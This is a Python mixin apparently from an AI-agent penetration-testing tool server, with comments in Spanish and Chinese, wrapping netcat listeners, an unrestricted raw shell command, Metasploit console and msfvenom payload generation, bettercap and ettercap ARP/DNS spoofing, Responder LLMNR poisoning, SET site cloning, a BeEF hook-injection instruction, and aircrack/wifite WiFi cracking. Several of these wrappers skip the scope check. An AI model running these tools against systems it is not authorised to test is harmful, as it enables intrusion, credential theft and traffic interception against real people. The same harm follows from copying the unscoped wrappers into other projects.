"""网络、MITM、Metasploit、无线与 shell 类工具实现。"""

import os
import re
import shlex
from datetime import datetime
from pathlib import Path

from ..input_sanitizer import InputSanitizer


class NetworkToolsMixin:
    async def _tool_netcat_connect(self, args: dict) -> dict:
        port = int(args["port"])
        mode = args.get("mode", "connect")
        target = args.get("target", "")
        extra = args.get("extra_args", "")

        if mode == "listen":
            cmd = ["nc", "-lvnp", str(port)]
        else:
            if not target:
                return self._error("Target is required in connect mode.")
            target = InputSanitizer.sanitize_target(target)
            self._scope_check(target)
            cmd = ["nc", target, str(port)]

        if extra:
            cmd += shlex.split(InputSanitizer.sanitize_generic(extra))

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("netcat"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_shell_command(self, args: dict) -> dict:
        raw_command = args.get("command", "").strip()
        if not raw_command:
            return self._error("No command provided.")

        stdout, stderr, rc = await self._run_shell(raw_command, self._default_timeout)
        output = stdout if stdout else stderr
        return self._ok(f"[exit code {rc}]\n{output}")

    async def _tool_msf_console(self, args: dict) -> dict:
        """Ejecutar comandos en Metasploit"""
        # Validation: Ensure exactly one of resource_script or commands is provided
        has_resource_script = "resource_script" in args and args["resource_script"] is not None
        has_commands = "commands" in args and args["commands"] is not None

        if not has_resource_script and not has_commands:
            return self._error("Error: Debe proporcionar 'resource_script' o 'commands', pero no ambos ni ninguno.")

        if has_resource_script and has_commands:
            return self._error("Error: No puede proporcionar ambos 'resource_script' y 'commands' al mismo tiempo. Proporcione solo uno.")

        workspace = args.get("workspace", "default")

        # Crear script resource temporal si se proporcionan comandos
        if has_commands:
            rc_content = f"workspace {workspace}\n"
            rc_content += "\n".join(args["commands"])
            rc_file = f"/tmp/msf_{datetime.now().strftime('%Y%m%d_%H%M%S')}.rc"
            with open(rc_file, "w") as f:
                f.write(rc_content)
            cmd = ["msfconsole", "-q", "-r", rc_file]
        else:  # has_resource_script
            cmd = ["msfconsole", "-q", "-r", args["resource_script"]]

        stdout, stderr, rc = await self._run_subprocess(cmd, 300)  # 5 minutos de timeout
        output = stdout if stdout else stderr

        # Parsear resultados para extraer información útil
        sessions = re.findall(r"Meterpreter session (\d+) opened", output)
        if sessions:
            output += f"\n[+] Sesiones Meterpreter abiertas: {', '.join(sessions)}"

        return self._ok(output)

    async def _tool_msfvenom(self, args: dict) -> dict:
        """Generar payloads con MSFVenom"""
        payload = args["payload"]
        lhost = args["lhost"]
        lport = args["lport"]
        fmt = args["format"]
        output_file = args.get("output_file", f"payload.{fmt}")

        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", output_file]

        if args.get("encoder"):
            cmd += ["-e", args["encoder"], "-i", str(args.get("iterations", 1))]
        if args.get("platform"):
            cmd += ["--platform", args["platform"]]
        if args.get("arch"):
            cmd += ["-a", args["arch"]]
        if args.get("badchars"):
            cmd += ["-b", args["badchars"]]
        if args.get("extra_args"):
            cmd += shlex.split(args["extra_args"])

        stdout, stderr, rc = await self._run_subprocess(cmd, 60)

        if rc == 0:
            result = f"[+] Payload generado exitosamente: {output_file}\n"
            result += f"[+] Tamaño: {os.path.getsize(output_file)} bytes\n"
            result += stdout
            return self._ok(result)
        else:
            return self._ok(stdout if stdout else stderr)

    async def _tool_metasploit_resource(self, args: dict) -> dict:
        """Crear y ejecutar scripts resource de Metasploit"""
        name = args["name"]
        commands = args.get("commands", [])
        exploit_module = args.get("exploit_module")
        payload = args.get("payload")
        options = args.get("options", {})

        rc_content = ""

        if exploit_module:
            rc_content += f"use {exploit_module}\n"
            for key, value in options.items():
                rc_content += f"set {key} {value}\n"
            if payload:
                rc_content += f"set PAYLOAD {payload}\n"
            if args.get("run"):
                rc_content += "run\n"

        if commands:
            rc_content += "\n".join(commands)

        rc_file = f"/tmp/{name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.rc"
        with open(rc_file, "w") as f:
            f.write(rc_content)

        cmd = ["msfconsole", "-q", "-r", rc_file]
        stdout, stderr, rc = await self._run_subprocess(cmd, 300)

        return self._ok(stdout if stdout else stderr)

    async def _tool_bettercap_scan(self, args: dict) -> dict:
        """BetterCAP para MITM"""
        target = InputSanitizer.sanitize_target(args["target"])
        self._scope_check(target)

        cmd = ["bettercap", "-eval"]

        # Construir comandos de BetterCAP
        commands = []

        if args.get("interface"):
            commands.append(f"set net.interface {args['interface']}")

        if args.get("gateway"):
            commands.append(f"set arp.spoof.targets {target}")
            commands.append(f"set arp.spoof.gateway {args['gateway']}")
            commands.append("arp.spoof on")

        if args.get("module") == "net.sniff":
            commands.append(f"set net.sniff.target {target}")
            commands.append("net.sniff on")
        elif args.get("module") == "dns.spoof":
            commands.append("dns.spoof on")

        if args.get("commands"):
            commands.extend(args["commands"])

        # Unir comandos con ;
        eval_cmd = "; ".join(commands)
        cmd.append(eval_cmd)

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("bettercap"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_responder_poison(self, args: dict) -> dict:
        """Responder para envenenamiento LLMNR/NBT-NS"""
        interface = args.get("interface", "eth0")
        mode = args.get("mode", "poison")

        cmd = ["responder", "-I", interface]

        if mode == "analyze":
            cmd.append("-A")

        if args.get("services"):
            for service in args["services"]:
                if service == "HTTP":
                    cmd.append("-w")
                elif service == "SMB":
                    cmd.append("--smb")
                elif service == "SQL":
                    cmd.append("--sql")
                elif service == "FTP":
                    cmd.append("--ftp")

        if args.get("wpad"):
            cmd.append("-F")
        if args.get("fingerprint"):
            cmd.append("-f")

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("responder"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_setoolkit(self, args: dict) -> dict:
        """Social Engineering Toolkit"""
        attack_vector = args["attack_vector"]

        # Crear config temporal para SET
        config_file = f"/tmp/set_config_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        with open(config_file, "w") as f:
            f.write(f"{attack_vector}\n")  # Attack vector
            if attack_vector == 2 and args.get("web_attack_type"):  # Web attack
                f.write(f"{args['web_attack_type']}\n")
                if args.get("clone_url"):
                    f.write("2\n")  # Site cloner
                    f.write(f"{args['clone_url']}\n")
            if args.get("payload"):
                f.write(f"{args['payload']}\n")
            if args.get("lhost"):
                f.write(f"{args['lhost']}\n")
            if args.get("lport"):
                f.write(f"{args['lport']}\n")

        cmd = ["setoolkit", "-c", config_file]
        stdout, stderr, rc = await self._run_subprocess(cmd, 300)
        return self._ok(stdout if stdout else stderr)

    async def _tool_beef_start(self, args: dict) -> dict:
        """Controlar BeEF framework"""
        action = args.get("action", "start")

        if action == "start":
            cmd = ["beef-xss", "--no-browser"]
            if args.get("port"):
                # Modificar config de BeEF para cambiar puerto
                pass
            stdout, stderr, rc = await self._run_subprocess(cmd, 30)
            return self._ok("BeEF iniciado en http://localhost:3000/ui/panel")

        elif action == "hook":
            if not args.get("target_url"):
                return self._error("target_url requerido para hook")
            hook_url = f"<script src='http://localhost:3000/hook.js'></script>"
            return self._ok(f"Inyecta este script en {args['target_url']}:\n{hook_url}")

        return self._ok("Comando no implementado")

    async def _tool_tcpdump_capture(self, args: dict) -> dict:
        """Capturar tráfico con tcpdump"""
        interface = args["interface"]

        cmd = ["tcpdump", "-i", interface, "-c", str(args.get("count", 100))]

        if args.get("filter"):
            cmd += [args["filter"]]
        if args.get("output_file"):
            cmd += ["-w", args["output_file"]]
        if args.get("verbose"):
            cmd += ["-v"]
        if args.get("duration"):
            cmd += ["-G", str(args["duration"]), "-W", "1"]

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("tcpdump"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_ettercap_mitm(self, args: dict) -> dict:
        """Ataques MITM con Ettercap"""
        target1 = InputSanitizer.sanitize_target(args["target1"])
        target2 = InputSanitizer.sanitize_target(args["target2"])
        self._scope_check(target1)
        self._scope_check(target2)

        interface = args.get("interface", "eth0")
        attack_type = args.get("attack_type", "arp")

        # Crear target file
        targets = f"{target1} {target2}"
        target_file = f"/tmp/ettercap_targets_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        with open(target_file, "w") as f:
            f.write(targets)

        cmd = ["ettercap", "-T", "-i", interface, "-j", target_file, "-M", attack_type]

        if args.get("filters"):
            for filter_file in args["filters"]:
                cmd += ["-F", filter_file]
        if args.get("plugins"):
            cmd += ["-P", ",".join(args["plugins"])]

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("ettercap"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_aircrack_suite(self, args: dict) -> dict:
        """Suite Aircrack-ng"""
        command = args["command"]
        cmd = []

        if command == "airmon":
            cmd = ["airmon-ng"]
            if args.get("interface"):
                cmd += ["start", args["interface"]]

        elif command == "airodump":
            cmd = ["airodump-ng"]
            if args.get("interface"):
                cmd += [args["interface"]]
            if args.get("bssid"):
                cmd += ["--bssid", args["bssid"]]
            if args.get("channel"):
                cmd += ["--channel", str(args["channel"])]
            if args.get("output_prefix"):
                cmd += ["-w", args["output_prefix"]]

        elif command == "aireplay":
            if not args.get("attack_type"):
                return self._error("attack_type requerido para aireplay")
            cmd = ["aireplay-ng", f"--{args['attack_type']}"]
            if args.get("bssid"):
                cmd += ["-a", args["bssid"]]
            if args.get("client"):
                cmd += ["-c", args["client"]]
            if args.get("interface"):
                cmd.append(args["interface"])

        elif command == "aircrack":
            if not args.get("capture_file"):
                return self._error("capture_file requerido para aircrack")
            cmd = ["aircrack-ng", args["capture_file"]]
            if args.get("wordlist"):
                cmd += ["-w", args["wordlist"]]
            if args.get("bssid"):
                cmd += ["--bssid", args["bssid"]]

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("aircrack"))
        return self._ok(stdout if stdout else stderr)

    async def _tool_wifite_audit(self, args: dict) -> dict:
        """Auditoría WiFi con Wifite"""
        interface = args.get("interface", "wlan0")

        cmd = ["wifite", "-i", interface, "--kill"]

        if args.get("target_bssid"):
            cmd += ["--target", args["target_bssid"]]
        if args.get("target_channel"):
            cmd += ["--channel", str(args["target_channel"])]
        if args.get("attack"):
            cmd += ["--attack", args["attack"]]
        if args.get("wordlist"):
            cmd += ["--dict", args["wordlist"]]
        if args.get("wps_pin"):
            cmd += ["--wps"]
        if args.get("no_wps"):
            cmd += ["--no-wps"]
        if args.get("power"):
            cmd += ["--power", str(args["power"])]
        if args.get("clients"):
            cmd += ["--clients-only"]
        if args.get("wep_attack"):
            cmd += ["--wep", args["wep_attack"]]

        stdout, stderr, rc = await self._run_subprocess(cmd, self._timeout_for("wifite"))
        return self._ok(stdout if stdout else stderr)
